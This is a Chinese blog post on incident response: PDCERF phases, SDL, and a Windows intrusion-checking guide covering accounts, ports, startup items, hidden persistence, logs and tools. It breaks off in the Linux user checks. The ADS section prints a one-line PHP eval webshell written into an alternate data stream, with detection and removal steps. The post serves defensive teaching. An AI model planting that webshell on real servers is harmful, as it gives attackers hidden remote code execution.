<!DOCTYPE html>


<html lang="zh-CN">
  

    <head>
      <meta charset="utf-8" />
        
      <meta
        name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1"
      />
      <title>应急响应 |  小张之栈</title>
  <meta name="generator" content="hexo-theme-ayer">
      
      <link rel="shortcut icon" href="/favicon.ico" />
       
<link rel="stylesheet" href="/dist/main.css">

      
<link rel="stylesheet" href="/css/fonts/remixicon.css">

      
<link rel="stylesheet" href="/css/custom.css">
 
      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
       
 

      <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
      />
      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>

      <!-- mermaid -->
      
      <style>
        .swal2-styled.swal2-confirm {
          font-size: 1.6rem;
        }
      </style>
    </head>
  </html>
</html>


<body>
  <div id="app">
    
      <canvas class="fireworks"></canvas>
      <style>
        .fireworks {
          position: fixed;
          left: 0;
          top: 0;
          z-index: 99999;
          pointer-events: none;
        }
      </style>
      
      
    <main class="content on">
      <section class="outer">
  <article
  id="post-应急响应"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
  应急响应
</h1>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/06/07/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" class="article-date">
  <time datetime="2023-06-07T02:11:37.000Z" itemprop="datePublished">2023-06-07</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a>
  </div>
  
<div class="word_count">
    <span class="post-time">
        <span class="post-meta-item-icon">
            <i class="ri-quill-pen-line"></i>
            <span class="post-meta-item-text"> 字数统计:</span>
            <span class="post-count">7.7k</span>
        </span>
    </span>

    <span class="post-time">
        &nbsp; | &nbsp;
        <span class="post-meta-item-icon">
            <i class="ri-book-open-line"></i>
            <span class="post-meta-item-text"> 阅读时长≈</span>
            <span class="post-count">29 分钟</span>
        </span>
    </span>
</div>
 
    </div>
      
    <div class="tocbot"></div>




  
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="1-应急响应是什么"><a href="#1-应急响应是什么" class="headerlink" title="1.应急响应是什么"></a>1.应急响应是什么</h1><p>指针对已经发生或可能发生的安全事件进行监控、分析、协调、处理、保护资产安全。主要是为了人们对网络安全有所认识、有所准备，以便在遇到突发网络安全事件时做到有序应对、妥善处理。</p>
<h1 id="2-PDCERF-6阶段"><a href="#2-PDCERF-6阶段" class="headerlink" title="2.PDCERF(6阶段)"></a>2.PDCERF(6阶段)</h1><ol>
<li><p><strong>准备</strong>阶段：预防，扫描、风险分析、补丁；制定可以实现应急响应目标的策略和规程，建立能够集合起来处理突发事件的体系。</p>
<p><strong>准备用来检测的工具和人，比如说ls、losf、ss、ifconfig这些东西</strong></p>
</li>
<li><p><strong>检测</strong>阶段：检测事件是已经发生的还是正在进行中的；找出事件产生原因，确定事件性质和严重性、预计修复时采用的专用资源</p>
<p><strong>紧急事件监测：包括防火墙、系统、web服务器、IDS&#x2F;WAF&#x2F;SIEM中的日志，不正常或者是执行了越权操作的用户，甚至还有管理员的报告（可以是邮件也可以电话短信什么的你可以看到听到的东西），我们要从这些数据中判断出受灾面积和攻击者入侵的点</strong></p>
</li>
<li><p><strong>抑制</strong>阶段：限制被破坏的范围。策略：完全关闭所有系统；从网络上断开主机或断开网络部分；修改所有防火墙和路由器过滤规则；封锁或删除被攻击的登录账号；加强对系统和网络行为的监控；设置诱饵服务器进一步获取事件信息；关闭受攻击的系统或其它相关系统的部分服务。</p>
</li>
<li><p><strong>根除</strong>阶段：:通过事件分析找出根源并彻底根除，以避免攻击者再次使用相同的手段攻击系统。</p>
</li>
<li><p><strong>恢复</strong>阶段：把被破坏的信息彻底恢复到正常运作状态。</p>
</li>
<li><p>攻击<strong>跟踪</strong>：据各种监控去确定没有其他的攻击行为和攻击向量，紧接着就是开会反省此次事件，写报告，持续改进工作流程和工作缓解</p>
</li>
</ol>
<h1 id="3-评价安全标准"><a href="#3-评价安全标准" class="headerlink" title="3.评价安全标准"></a>3.评价安全标准</h1><p>评价企业安全建设做的好与坏的标准就是ROI（投资回报率），即攻击者攻击的成本是10元，你去防御这个攻击的成本是1毛，说明这个安全建设是有效的。</p>
<h1 id="4-SDL"><a href="#4-SDL" class="headerlink" title="4.SDL"></a>4.SDL</h1><p>security development lifecycle，即安全开发生命周期。</p>
<p>目的：从安全漏洞产生的根源上解决应用安全问题，通过对软件开发流程的控制，保证产品的安全性。</p>
<p>SDL是全面软件生命周期管理与最佳实践手段和工具相结合的产物，使用SDL方式可有效提升系统的安全等级，并将安全工作提升到可进行标准化实施的程度。微软的SDL理论基于三个核心概念开展：培训、持续的安全问题改进和问责制。SDL的目标是减少应用软件的漏洞数量级和严重程度，其完整生命周期主要阶段</p>
<p>SDL的第一步就是安全培训。</p>
<h2 id="安全培训内容"><a href="#安全培训内容" class="headerlink" title="安全培训内容"></a>安全培训内容</h2><p>Part 1：安全设计：包括减小攻击面、深度防御、最小权限原则、服务器安全配置等<br>Part 2：威胁建模：概述、设计意义、基于威胁建模的编码约束<br>Part 3：安全编码：缓冲区溢出（针对C&#x2F;C++）、整数算法错误（针对C&#x2F;C++）、XSS&#x2F;CSRF（对于Web类应用）、SQL注入（对于Web类应用）、弱加密<br>Part 4：安全测试：安全测试和黑盒测试的区别、风险评估、安全测试方法（代码审计、fuzz等）<br>Part 5：隐私与敏感数据：敏感数据类型、风险评估、隐私开发和测试的最佳实践<br>Part 6：高级概念：高级安全概念、可信用户界面设计、安全漏洞细节、自定义威胁缓解</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230619214555452.png" alt="完整周期主要阶段"></p>
<h1 id="windows入侵排查"><a href="#windows入侵排查" class="headerlink" title="windows入侵排查"></a>windows入侵排查</h1><h2 id="1-检查系统账号安全"><a href="#1-检查系统账号安全" class="headerlink" title="1.检查系统账号安全"></a>1.检查系统账号安全</h2><h3 id="1-查看服务器是否有弱口令、远程管理端口是否对公网开放"><a href="#1-查看服务器是否有弱口令、远程管理端口是否对公网开放" class="headerlink" title="1.查看服务器是否有弱口令、远程管理端口是否对公网开放"></a>1.查看服务器是否有弱口令、远程管理端口是否对公网开放</h3><blockquote>
<p>根据实际情况咨询相关服务器管理员</p>
</blockquote>
<h3 id="2-检查服务器是否存在可疑账号、新增账号"><a href="#2-检查服务器是否存在可疑账号、新增账号" class="headerlink" title="2.检查服务器是否存在可疑账号、新增账号"></a>2.检查服务器是否存在可疑账号、新增账号</h3><blockquote>
<p>打开cmd窗口，输入lusrmgr.msc命令，查看是否有可疑或者新增的账号，若存在管理员Administrators群组内新增的账户，请立即禁用或者删除</p>
</blockquote>
<h3 id="3-查看服务器注册表是否存在隐藏账号、克隆账号"><a href="#3-查看服务器注册表是否存在隐藏账号、克隆账号" class="headerlink" title="3.查看服务器注册表是否存在隐藏账号、克隆账号"></a>3.查看服务器注册表是否存在隐藏账号、克隆账号</h3><blockquote>
<p>打开注册表–regedit.exe或者regedit，查看管理员对应键值</p>
</blockquote>
<h3 id="4-结合日志，查看管理员登陆时间、用户名是否存在异常"><a href="#4-结合日志，查看管理员登陆时间、用户名是否存在异常" class="headerlink" title="4.结合日志，查看管理员登陆时间、用户名是否存在异常"></a>4.结合日志，查看管理员登陆时间、用户名是否存在异常</h3><blockquote>
<p>使用命令提示符，输入eventvwr.msc，打开事件查看器</p>
</blockquote>
<blockquote>
<p>导出windows日志–安全，利用微软官方工具 Log Parser进行分析</p>
</blockquote>
<h2 id="2-检查异常端口、进程"><a href="#2-检查异常端口、进程" class="headerlink" title="2.检查异常端口、进程"></a>2.检查异常端口、进程</h2><h3 id="1-检查端口连接情况，是否有远程连接或者可疑连接"><a href="#1-检查端口连接情况，是否有远程连接或者可疑连接" class="headerlink" title="1.检查端口连接情况，是否有远程连接或者可疑连接"></a>1.检查端口连接情况，是否有远程连接或者可疑连接</h3><blockquote>
<p>使用netstat -ano命令查看当前的网络连接，查找可疑的ESTABLISHED</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano | findstr ESTAB </span><br></pre></td></tr></table></figure>

<blockquote>
<p>根据netstat命令定位的PID编号，再通过tasklist命令进行进程定位</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist | findstr “PID”</span><br></pre></td></tr></table></figure>

<blockquote>
<p>QQPCRTP.exe                   2548 Services                   0     65,856 K<br>svchost.exe                  12548 Services                   0     10,436 K</p>
</blockquote>
<h3 id="2-进程"><a href="#2-进程" class="headerlink" title="2.进程"></a>2.进程</h3><blockquote>
<p>命令提示符输入msinfo32，点击软件环境–正在运行任务，查看进程的详细信息</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230914131914031.png"></p>
<blockquote>
<p>使用D盾或者火绒剑查杀工具，关注没有签名信息的进程</p>
<p>通过微软官方提供的Process Explorer等工具进行排查</p>
<p>对于进程和子进程，主要关注：</p>
<p>没有签名验证信息的进程</p>
<p>没有描述信息的进程</p>
<p>进程的属主</p>
<p>进程的路径是否合法</p>
<p>cpu或者内存资源占用长时间过高的进程</p>
</blockquote>
<p>查看端口对应的PID：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano | findstr “PORT”</span><br></pre></td></tr></table></figure>

<blockquote>
<p>netstat -ano | findstr 445</p>
</blockquote>
<p>查看进程对应的PID：任务管理器—-查看—-选择列—PID:</p>
<p>然后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist | findstr “PID”</span><br></pre></td></tr></table></figure>



<p>查看进程对应的程序位置：</p>
<blockquote>
<p>任务管理器–选择对应进程–右键打开文件位置</p>
</blockquote>
<p>或者命令行：<code>命令提示符输入wmic，cmd界面输入process</code></p>
<p>查看Windows服务所对应的端口：</p>
<blockquote>
<p>%systemroot%&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;services（一般 %systemroot% 就是 C:\Windows 路径）</p>
</blockquote>
<h2 id="3-检查启动项、计划任务、服务"><a href="#3-检查启动项、计划任务、服务" class="headerlink" title="3.检查启动项、计划任务、服务"></a>3.检查启动项、计划任务、服务</h2><h3 id="3-1-检查服务器是否有异常的启动项"><a href="#3-1-检查服务器是否有异常的启动项" class="headerlink" title="3.1.检查服务器是否有异常的启动项"></a>3.1.检查服务器是否有异常的启动项</h3><ol>
<li><p>登录服务器(默认情况下此目录在是一个空目录，确认是否有<strong>非业务</strong>程序在该目录下)</p>
<blockquote>
<p>系统启动文件夹：c:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</p>
<p>或者:</p>
<p>在文件资源管理器上方直接输入:<code>shell:Common Startup</code></p>
</blockquote>
<blockquote>
<p>用户启动文件夹：c:\Users\用户名\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</p>
<p>或者</p>
<p>…shell:startup</p>
</blockquote>
</li>
<li><p>单击开始菜单 &gt;【运行 】，输入 msconfig，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。</p>
</li>
<li><p>单击【开始】&gt;【运行】，输入 regedit，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项：</p>
<ul>
<li>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\run</li>
<li>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</li>
<li>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</li>
<li>检查右侧是否有启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马</li>
</ul>
</li>
<li><p>利用安全软件查看启动项、开机时间管理等。</p>
</li>
<li><p>组策略，运行 <code>gpedit.msc</code></p>
</li>
</ol>
<h3 id="3-2-检查计划任务"><a href="#3-2-检查计划任务" class="headerlink" title="3.2 检查计划任务"></a>3.2 检查计划任务</h3><ol>
<li>单击【开始】&gt;【设置】&gt;【控制面板】&gt;【任务计划】，查看计划任务属性，可以可以发现木马文件的路径</li>
<li>单击【开始】&gt;【运行】；输入 <code>cmd</code>，然后输入 <code>at</code> （如果弃用了，就用<code>schtasks.exe</code>），检查计算机与网络上的其它计算机之间的会话或计划任务，如有，则确认是否为正常连接。</li>
</ol>
<h3 id="3-3-服务自启动"><a href="#3-3-服务自启动" class="headerlink" title="3.3 服务自启动"></a>3.3 服务自启动</h3><p>单击【开始】&gt;【运行】，输入 <code>services.msc</code>，注意服务状态和启动类型，检查是否有异常服务。</p>
<h3 id="3-4-破除权限维持隐藏"><a href="#3-4-破除权限维持隐藏" class="headerlink" title="3.4 破除权限维持隐藏"></a>3.4 破除权限维持隐藏</h3><h4 id="3-4-1-利用文件属性"><a href="#3-4-1-利用文件属性" class="headerlink" title="3.4.1 利用文件属性"></a>3.4.1 利用文件属性</h4><ul>
<li>简单的隐藏手段：就是文件右键属性，隐藏；</li>
</ul>
<p><strong>查看的话：文件资源管理器勾选显示隐藏文件即可</strong></p>
<ul>
<li>高级点的：cmd中用:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">attrib +s +a +h +r D:\1.txt</span><br><span class="line">//把原本的文件夹增加了系统文件属性s、存档文件属性a、只读文件属性r和隐藏文件属性h</span><br></pre></td></tr></table></figure>

<p><strong>查看的话：打开电脑文件夹选项卡(文件资源管理器-&gt;文件-&gt;更改文件夹和搜索选项)，取消”隐藏受保护的操作系统文件“勾选，把”隐藏文件和文件夹“下面的单选选择“显示隐藏的文件、文件夹和驱动器</strong></p>
<h4 id="3-4-2-利用ADS"><a href="#3-4-2-利用ADS" class="headerlink" title="3.4.2 利用ADS"></a>3.4.2 利用ADS</h4><p>隐藏原理：在服务器上echo一个数据流文件，index.php如果是正常的网页文件，可以在其中写入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo ^&lt;?php @eval($_POST[&#x27;chopper&#x27;]);?^&gt; &gt; index.php:hidden.jpg</span><br></pre></td></tr></table></figure>

<p>生成了一个不可见的shell hidden.jpg，常规的文件管理器、type命令，dir命令、del命令发现都找不出那个hidden.jpg的</p>
<p><strong>解决方法：</strong></p>
<blockquote>
<ul>
<li>查看index.php:hidden.jsp内容，进入文件所在的目录，notepad index.php:hidden.jpg 或者 dir &#x2F;r。</li>
<li>删除index.php:hidden.jpg，之间删除index.php即可。</li>
</ul>
</blockquote>
<p>ps:</p>
<blockquote>
<p>参考<a target="_blank" rel="noopener" href="http://www.hzhcontrols.com/new-792761.html">http://www.hzhcontrols.com/new-792761.html</a></p>
</blockquote>
<h4 id="3-4-3-驱动级文件隐藏"><a href="#3-4-3-驱动级文件隐藏" class="headerlink" title="3.4.3 驱动级文件隐藏"></a>3.4.3 驱动级文件隐藏</h4><p>隐藏原理：通过软件，如<code>Easy File Locker</code></p>
<p><strong>解决方法：</strong></p>
<p>先确认是否隐藏：</p>
<blockquote>
<p>如果网站目录未查找到相关文件，且系统目录存在存在以下文件，那么应该是遭遇了驱动级文件隐藏</p>
<ul>
<li>c:\WINDOWS\xlkfs.dat</li>
<li>c:\WINDOWS\xlkfs.dll</li>
<li>c:\WINDOWS\xlkfs.ini</li>
<li>c:\WINDOWS\system32\drivers\xlkfs.sys</li>
</ul>
</blockquote>
<p>清除：</p>
<p>在cmd下：</p>
<blockquote>
<p>1、查询服务状态： sc qc xlkfs</p>
<p>2、停止服务： net stop xlkfs 服务停止以后，经驱动级隐藏的文件即可显现</p>
<p>3、删除服务： sc delete xlkfs</p>
<p>4、删除系统目录下面的文件，重启系统，确认服务已经被清理了</p>
</blockquote>
<p>其它文件隐藏方式：装成一个系统文件夹图标，利用畸形文件名、保留文件名无法删除，甚至取一个与系统文件很像的文件名并放在正常目录里面，很难辨别出来。而更多的恶意程序开始实现“无文件”攻击，这种方式极难被发现</p>
<h4 id="3-4-4-隐藏账号"><a href="#3-4-4-隐藏账号" class="headerlink" title="3.4.4 隐藏账号"></a>3.4.4 隐藏账号</h4><p>隐藏原理：window 隐藏系统用户操作，CMD命令行下，建立了一个用户名为“test$”，密码为“abc123!”的简单隐藏账户,并且把该隐藏账户提升为了管理员权限</p>
<p><strong>解决方法：</strong></p>
<blockquote>
<p>通过任务管理器查看是否存在用户名后接$的用户，存在则使用D盾_web查杀工具，使用克隆账号检测功能进行查看，可检测出隐藏、克隆账号</p>
</blockquote>
<p>ps:</p>
<blockquote>
<p>隐藏账户：<a target="_blank" rel="noopener" href="https://blog.csdn.net/p36273/article/details/130775285">https://blog.csdn.net/p36273/article/details/130775285</a></p>
</blockquote>
<h4 id="3-4-5-端口复用"><a href="#3-4-5-端口复用" class="headerlink" title="3.4.5 端口复用"></a>3.4.5 端口复用</h4><p>隐藏原理：可以使用WinRM服务或者其他的工具实现端口复用</p>
<p><strong>解决方法：</strong></p>
<blockquote>
<p>复用时会在安全日志中留下痕迹</p>
</blockquote>
<h4 id="3-4-6-进程注入"><a href="#3-4-6-进程注入" class="headerlink" title="3.4.6 进程注入"></a>3.4.6 进程注入</h4><p>隐藏原理：是病毒木马的惯用手段，同时，它也是一种隐藏技术</p>
<p><strong>解决方法：</strong></p>
<blockquote>
<p>1.通过TCPview显示已建立的TCP连接，我们可以看到异常的连接，同时，恶意软件将以绿色显示不到一秒钟，然后变成红色消失，如此循环。</p>
<p>2.利用process monitor或者火绒剑监控进程都可以定位到注入进程。</p>
<p>3.利用process monitor捕捉通信过程，有规律的请求取决于sleep设置的间隔</p>
</blockquote>
<h2 id="4-检查系统相关信息"><a href="#4-检查系统相关信息" class="headerlink" title="4.检查系统相关信息"></a>4.检查系统相关信息</h2><h3 id="4-1-查看系统版本以及补丁信息"><a href="#4-1-查看系统版本以及补丁信息" class="headerlink" title="4.1 查看系统版本以及补丁信息"></a>4.1 查看系统版本以及补丁信息</h3><p>检查方法：单击【开始】&gt;【运行】，输入 <code>systeminfo</code>，查看系统信息</p>
<h3 id="4-2-查看可疑目录文件"><a href="#4-2-查看可疑目录文件" class="headerlink" title="4.2 查看可疑目录文件"></a>4.2 查看可疑目录文件</h3><ol>
<li>查看用户目录，新建账号会在这个目录生成一个用户目录，查看是否有新建用户目录<ol>
<li>Window 2003版本 C:\Documents and Settings </li>
<li>Window 2008R2及以后版本 C:\Users\</li>
</ol>
</li>
<li>单击【开始】&gt;【运行】，输入 <code>%UserProfile%\Recent</code>，分析最近打开分析可疑文件</li>
<li>在服务器各个目录，可根据文件夹内文件列表<strong>时间进行排序</strong>，查找可疑文件</li>
<li>回收站、浏览器下载目录、浏览器历史记录</li>
<li>修改时间在创建时间之前的为可疑文件</li>
</ol>
<h3 id="4-3-找出同一时间范围内创建的文件"><a href="#4-3-找出同一时间范围内创建的文件" class="headerlink" title="4.3 找出同一时间范围内创建的文件"></a>4.3 找出同一时间范围内创建的文件</h3><p>发现并得到 WebShell、远控木马的创建时间，如何找出同一时间范围内创建的文件</p>
<ul>
<li>a、利用 Registry Workshop 注册表编辑器的搜索功能，可以找到最后写入时间区间的文件	</li>
<li>b、利用计算机自带文件搜索功能，指定修改时间进行搜索</li>
</ul>
<h3 id="4-4-自动化查杀"><a href="#4-4-自动化查杀" class="headerlink" title="4.4 自动化查杀"></a>4.4 自动化查杀</h3><ul>
<li><p>病毒查杀</p>
<blockquote>
<p>检查方法：下载安全软件，更新最新病毒库，进行全盘扫描</p>
</blockquote>
</li>
<li><p>webshell查杀</p>
<blockquote>
<p>选择具体站点路径进行webshell查杀，建议使用两款WebShell 查杀工具同时查杀，可相互补充规则库的不足</p>
</blockquote>
</li>
</ul>
<h2 id="5-日志分析"><a href="#5-日志分析" class="headerlink" title="5.日志分析"></a>5.日志分析</h2><p>Windows系统日志是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检查错误发生的原因，或者寻找受到攻击时攻击者留下的痕迹。</p>
<p>系统和应用程序日志存储着故障排除信息，对于系统管理员更为有用。 安全日志记录着事件审计信息，包括用户验证（登录、远 程访问等）和特定用户在认证后对系统做了什么，对于调查人员而言，更有帮助</p>
<p>分类如下：</p>
<ul>
<li><strong>系统日志</strong>，记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。默认位置<code>%SystemRoot%\System32\Winevt\Logs\System.evtx</code></li>
<li><strong>应用程序日志</strong>，包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序日志中记录文件错误，程序开发人员可以自行决定监视哪些事件。默认位置：<code>%SystemRoot%\System32\Winevt\Logs\Application.evtx</code></li>
<li><strong>安全日志</strong>，记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。安全日志也是调查取证中最常用到的日志。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应。默认位置：<code>%SystemRoot%\System32\Winevt\Logs\Security.evtx</code></li>
</ul>
<p>ID说明：</p>
<blockquote>
<ul>
<li>4624 登录成功</li>
<li>4625 登录失败</li>
<li>4634 注销成功</li>
<li>4647 用户启动的注销</li>
<li>4672 使用超级用户（管理员）进行登录</li>
<li>4720 创建用户</li>
</ul>
</blockquote>
<h4 id="Log-Parser日志分析"><a href="#Log-Parser日志分析" class="headerlink" title="Log Parser日志分析"></a>Log Parser日志分析</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-andrea/p/17452895.html">https://www.cnblogs.com/-andrea/p/17452895.html</a></p>
<h4 id="系统日志"><a href="#系统日志" class="headerlink" title="系统日志"></a>系统日志</h4><ul>
<li>a、前提：开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</li>
<li>b、Win+R 打开运行，输入 “eventvwr.msc”，回车运行，打开”事件查看器”。</li>
<li>c、导出应用程序日志、安全日志、系统日志，利用 <a target="_blank" rel="noopener" href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">LogParser</a> 进行分析。</li>
</ul>
<h4 id="Web访问体质"><a href="#Web访问体质" class="headerlink" title="Web访问体质"></a>Web访问体质</h4><ul>
<li>a、找到中间件的web日志，打包到本地方便进行分析</li>
<li>b、推荐工具：Windows 下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。</li>
<li>Linux 下，使用 Shell 命令组合查询分析</li>
</ul>
<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h4 id="病毒分析"><a href="#病毒分析" class="headerlink" title="病毒分析"></a>病毒分析</h4><blockquote>
<ul>
<li>PCHunter：<a target="_blank" rel="noopener" href="http://www.xuetr.com/">http://www.xuetr.com</a></li>
<li>火绒剑：<a target="_blank" rel="noopener" href="https://www.huorong.cn/">https://www.huorong.cn</a></li>
<li>Process Explorer：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer</a></li>
<li>processhacker：<a target="_blank" rel="noopener" href="https://processhacker.sourceforge.io/downloads.php">https://processhacker.sourceforge.io/downloads.php</a></li>
<li>autoruns：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/enus/sysinternals/downloads/autoruns">https://docs.microsoft.com/enus/sysinternals/downloads/autoruns</a></li>
<li>OTL：<a target="_blank" rel="noopener" href="https://www.bleepingcomputer.com/download/otl/">https://www.bleepingcomputer.com/download/otl/</a></li>
<li>SysInspector：<a target="_blank" rel="noopener" href="http://download.eset.com.cn/download/detail/?product=sysinspector">http://download.eset.com.cn/download/detail/?product=sysinspector</a></li>
</ul>
</blockquote>
<h4 id="病毒查杀"><a href="#病毒查杀" class="headerlink" title="病毒查杀"></a>病毒查杀</h4><blockquote>
<ul>
<li>卡巴斯基：<a target="_blank" rel="noopener" href="http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe">http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe</a> （推荐理由：绿色</li>
</ul>
<p>版、最新病毒库）</p>
<ul>
<li>大蜘蛛：<a target="_blank" rel="noopener" href="http://free.drweb.ru/download+cureit+free%EF%BC%88%E6%8E%A8%E8%8D%90%E7%90%86%E7%94%B1%EF%BC%9A%E6%89%AB%E6%8F%8F%E5%BF%AB%E3%80%81%E4%B8%80%E6%AC%A1%E4%B8%8B%E8%BD%BD%E5%8F%AA%E8%83%BD%E7%94%A81%E5%91%A8%EF%BC%8C%E6%9B%B4%E6%96%B0%E7%97%85%E6%AF%92%E5%BA%93%EF%BC%89">http://free.drweb.ru/download+cureit+free（推荐理由：扫描快、一次下载只能用1周，更新病毒库）</a></li>
<li>火绒安全软件：<a target="_blank" rel="noopener" href="https://www.huorong.cn/">https://www.huorong.cn</a></li>
<li>360杀毒：<a target="_blank" rel="noopener" href="http://sd.360.cn/download_center.html">http://sd.360.cn/download_center.html</a></li>
</ul>
</blockquote>
<h4 id="在线病毒扫描网站"><a href="#在线病毒扫描网站" class="headerlink" title="在线病毒扫描网站"></a>在线病毒扫描网站</h4><blockquote>
<ul>
<li>Virustotal：<a target="_blank" rel="noopener" href="https://www.virustotal.com/">https://www.virustotal.com</a></li>
<li>Virscan：<a target="_blank" rel="noopener" href="http://www.virscan.org/">http://www.virscan.org</a></li>
<li>腾讯哈勃分析系统：<a target="_blank" rel="noopener" href="https://habo.qq.com/">https://habo.qq.com</a></li>
<li>Jotti 恶意软件扫描系统：<a target="_blank" rel="noopener" href="https://virusscan.jotti.org/">https://virusscan.jotti.org</a></li>
</ul>
</blockquote>
<h4 id="病毒动态"><a href="#病毒动态" class="headerlink" title="病毒动态"></a>病毒动态</h4><blockquote>
<ul>
<li>CVERC-国家计算机病毒应急处理中心：<a target="_blank" rel="noopener" href="http://www.cverc.org.cn/">http://www.cverc.org.cn</a></li>
<li>微步在线威胁情报社区：<a target="_blank" rel="noopener" href="https://x.threatbook.cn/">https://x.threatbook.cn</a></li>
<li>火绒安全论坛：<a target="_blank" rel="noopener" href="http://bbs.huorong.cn/forum-59-1.html">http://bbs.huorong.cn/forum-59-1.html</a></li>
<li>爱毒霸社区：<a target="_blank" rel="noopener" href="http://bbs.duba.net/">http://bbs.duba.net</a></li>
<li>腾讯电脑管家：<a target="_blank" rel="noopener" href="http://bbs.guanjia.qq.com/forum-2-1.html">http://bbs.guanjia.qq.com/forum-2-1.html</a></li>
</ul>
</blockquote>
<h4 id="webshell查杀"><a href="#webshell查杀" class="headerlink" title="webshell查杀"></a>webshell查杀</h4><blockquote>
<ul>
<li>D盾_Web查杀：<a target="_blank" rel="noopener" href="http://www.d99net.net/index.asp">http://www.d99net.net/index.asp</a></li>
<li>河马 WebShell 查杀：<a target="_blank" rel="noopener" href="http://www.shellpub.com/">http://www.shellpub.com</a></li>
</ul>
</blockquote>
<h1 id="5-场景与处理流程"><a href="#5-场景与处理流程" class="headerlink" title="5.场景与处理流程"></a>5.场景与处理流程</h1><h2 id="1-场景"><a href="#1-场景" class="headerlink" title="1.场景"></a>1.场景</h2><p>勒索病毒、挖矿木马、Webshell、网页篡改、DDos攻击、数据泄露、流量劫持。</p>
<h2 id="2-处理流程"><a href="#2-处理流程" class="headerlink" title="2.处理流程"></a>2.处理流程</h2><p>事件类型</p>
<p>时间范围</p>
<h3 id="系统排查"><a href="#系统排查" class="headerlink" title="系统排查"></a>系统排查</h3><h4 id="a-系统基本信息"><a href="#a-系统基本信息" class="headerlink" title="a.系统基本信息"></a>a.系统基本信息</h4><p>windows</p>
<blockquote>
<p>msinfo32：系统信息，显示本地计算机的硬件资源、组件和软件环境信息。正在运行任务、服务、系统驱动程序、加载的模块、启动程序等进行排查。<br>systeminfo：系统信息，主机名、操作系统版本等详细信息。</p>
</blockquote>
<p>Linux</p>
<blockquote>
<p>lscpu：CPU信息，型号、主频、内核等。</p>
<p>uname -a：操作系统信息</p>
<p>cat &#x2F;proc&#x2F;version：操作系统版本信息</p>
<p>lsmod：所有载入系统的模块信息</p>
</blockquote>
<h4 id="b-用户信息"><a href="#b-用户信息" class="headerlink" title="b.用户信息"></a>b.用户信息</h4><p>windows</p>
<blockquote>
<p>net user：查看用户账户信息（看不到以$结尾的隐藏用户）<br>net user username：查看用户名为username用户的详细信息； lusrmgr.msc：打开本地用户与组，可查看隐藏用户；<br>打开计算机管理-本地用户与组可查看隐藏用户;</p>
<p>wmic useraccount get name,sid：查看系统中的所有用户；<br>注册表查看是否存在克隆账户：regedit打开注册表，选择HKEY_LOCAL_MACHHINE下的SAM选项，为该项添加允许父项的继承权限传播到该对象和所有子对象。包括那些在此明确定义的目标和用在此显示的可以应用到子对象的项目替代所有子对象的权限项目权限，使当前用户拥有SAM的读取权限。添加之后F5刷新即可访问子项并查看用户信息。同时，在此项下导出所有00000开头的项，将所有导出的项与000001F4（对应Administrator用户）导出内容做比较，若其中的F值相同，则表示可能为克隆账户。</p>
</blockquote>
<p>Linux</p>
<blockquote>
